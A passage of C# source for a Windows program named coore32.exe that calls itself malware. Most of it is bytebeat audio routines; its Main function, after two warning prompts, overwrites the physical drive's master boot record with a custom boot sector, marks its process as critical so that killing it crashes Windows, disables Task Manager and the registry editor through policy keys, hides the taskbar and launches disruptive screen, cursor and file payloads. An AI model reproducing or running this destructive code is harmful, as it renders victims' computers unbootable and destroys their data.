            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte9(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                (t * "218151231515653242639654782318958234"[(t >> 12) % 32] >> 6 & 95) * 3e4 / (t & 12287)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte10(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                (t & t >> 6) + (t | t >> 8) + (t | t >> 7) + (t | t >> 9) * t
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte11(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                (127 * Math.Sin(t / 16 * "010145450101454516171617202120211617161720212021"[t / 11025 & 31])) - 64
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte12(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                (t % 32768 >> 7) * Math.Sin(t + "66546657"[t >> 13 & 7])
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte13(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                (t * t >> 11 & 7) * t % 257 & t % 255
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte14(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                (t >> (t & t >> 12) - (t / 1024 % 4 - 3) & 127) + (8e3 * -(1 - t % 16384 / 1e4) / 69)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte15(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                (("221010109911151555"[(t >> 11) % 16] * t & 127) + (t >> 10) & 128) + 10 * 16383 - (t % 16384)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte16(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                (("203020250302018033"[(t >> 12) % 16] * t >> 2 & 127) + (t >> 8) & 128) + ("0,1"[(t >> 13) % 2] * t >> 2 & 127) + 128 * Math.Sin(4095 >> (t % 16384))
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte17(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                "102030240"[(t >> 12) % 8] * t + "0128"[(t >> 12) % 2] * 1 | t >> 8
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte18(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                (t - t * (t / 16 / 20) ^ t)
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte19(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                ("1204043844850480439383733133120150105010504040438457070778373313312015010501050"[(t >> 12) % 64] * (t >> 5)) | (t >> t * (t >> 9 | 17))
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    private static void byte20(int hz, int secs)
    {
        Random random = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());  // chunk id
            writer.Write((UInt32)0);             // chunk size
            writer.Write("WAVE".ToCharArray());  // format

            writer.Write("fmt ".ToCharArray());  // chunk id
            writer.Write((UInt32)16);            // chunk size
            writer.Write((UInt16)1);             // audio format

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
            writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                (t ^ t >> 10) * t >> 16
                    //t * (42 & t >> 10)
                    //t | t % 255 | t % 257
                    //t * (t >> 9 | t >> 13) & 16
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
            writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern bool ShowWindow(int hWnd, int cmdShow);


    private const int SW_HIDE = 0x0000;
    private const int SW_SHOW = 0x0001;
    [STAThread]
    private static void Main()
    {
        Drawer redrawer = new ReDrawer();
        Drawer rdrawer = new randomdrawer();
        Drawer rdrawer1 = new randomdrawer1();
        Drawer movewin = new Window();
        Drawer movecur = new Cur();
        Drawer textwin = new Windowtext();
        Drawer typewin = new Type();
        Drawer Openwin = new Open();
        Drawer sendm = new SendM();
        Drawer cfile = new createfiles();
        Drawer mbox = new msg();
        if (MessageBox.Show("This is a malware,\nClick Yes to run.\nClick No to run.", "coore32.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
        {
            if (MessageBox.Show("Final Warning!!\nAre you sure?", "coore32.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
            {
                var mbrData = new byte[] { 0xFA, 0x68, 0x00, 0xA0, 0x07, 0x31, 0xFF, 0x31, 0xC0, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xEB, 0x00, 0xB4, 0x0C, 0x04, 0x45, 0xB7, 0x00, 0x83, 0xC1, 0x45, 0x83, 0xC2, 0x00, 0xCD, 0x10, 0xB4, 0x0C, 0x04, 0x45, 0xB7, 0x00, 0x83, 0xC1, 0x00, 0x83, 0xC2, 0x45, 0xCD, 0x10, 0xEB, 0xE2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA };

                var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                    OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
                try
                {
                    int isCritical = 1;
                    int BreakOnTermination = 0x1D;
                    Process.EnterDebugMode();
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                }
                catch { }
                try
                {
                    RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                }
                catch { }
                try
                {
                    RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                }
                catch { }
                try
                {
                    int hwnd = FindWindow("Shell_TrayWnd", "");
                    ShowWindow(hwnd, SW_HIDE);
                }
                catch { }
                Thread.Sleep(3000);
                mbox.Start();
                Thread.Sleep(2000);
                cfile.Start();
                movewin.Start();
                movecur.Start();
                //textwin.Start();
                typewin.Start();
                Openwin.Start();
                sendm.Start();
                redrawer.Start();
                rdrawer.Start();
                byte1(44100, 30);
                rdrawer1.Start();
                byte2(44100, 30);
                byte3(11025, 30);
                byte4(11025, 30);
                byte5(22050, 30);
                byte6(44100, 30);
                byte7(11025, 30);
                byte8(44100, 30);
                byte9(44100, 30);
                byte10(44100, 30);
                byte11(44100, 30);
                byte12(44100, 30);
                byte13(44100, 30);
                byte14(44100, 30);
                byte15(44100, 30);
                byte16(44100, 30);
                byte17(44100, 30);
                byte18(44100, 30);
                byte19(44100, 30);
                byte20(44100, 30);
                Environment.Exit(69);
            }
        }
    }

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(uint crColor);

    [DllImport("gdi32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DeleteObject([In] IntPtr hObject);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

    [DllImport("user32.dll")]
    private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);

    [DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
    public static extern IntPtr CreateCompatibleBitmap([In] IntPtr hdc, int nWidth, int nHeight);

    [System.Runtime.InteropServices.DllImportAttribute("msimg32.dll", EntryPoint = "AlphaBlend")]
    [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
    public static extern bool AlphaBlend(System.IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, System.IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, _BLENDFUNCTION ftn);

    [System.Runtime.InteropServices.StructLayoutAttribute(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct _BLENDFUNCTION
    {

        /// BYTE->char
        public byte BlendOp;

        /// BYTE->char
        public byte BlendFlags;

        /// BYTE->char
        public byte SourceConstantAlpha;

        /// BYTE->char
        public byte AlphaFormat;
    }
    public const int AC_SRC_OVER = 0;

    [DllImport("gdi32.dll")]
    static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
   int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
   int yMask);

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT
    {
        public int X;
        public int Y;

        public POINT(int x, int y)
        {
            this.X = x;
            this.Y = y;
        }

        public static implicit operator System.Drawing.Point(POINT p)
        {
            return new System.Drawing.Point(p.X, p.Y);
        }

        public static implicit operator POINT(System.Drawing.Point p)
        {
            return new POINT(p.X, p.Y);
        }
    }
    [DllImport("gdi32.dll")]
    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
    int nWidthDest, int nHeightDest,
    IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
    TernaryRasterOperations dwRop);
    public enum TernaryRasterOperations
    {
        SRCCOPY = 0x00CC0020, /* dest = source*/
        SRCPAINT = 0x00EE0086, /* dest = source OR dest*/
        SRCAND = 0x008800C6, /* dest = source AND dest*/
        SRCINVERT = 0x00660046, /* dest = source XOR dest*/
        SRCERASE = 0x00440328, /* dest = source AND (NOT dest )*/
        NOTSRCCOPY = 0x00330008, /* dest = (NOT source)*/
        NOTSRCERASE = 0x001100A6, /* dest = (NOT src) AND (NOT dest) */
        MERGECOPY = 0x00C000CA, /* dest = (source AND pattern)*/
        MERGEPAINT = 0x00BB0226, /* dest = (NOT source) OR dest*/
        PATCOPY = 0x00F00021, /* dest = pattern*/
        PATPAINT = 0x00FB0A09, /* dest = DPSnoo*/
        PATINVERT = 0x005A0049, /* dest = pattern XOR dest*/
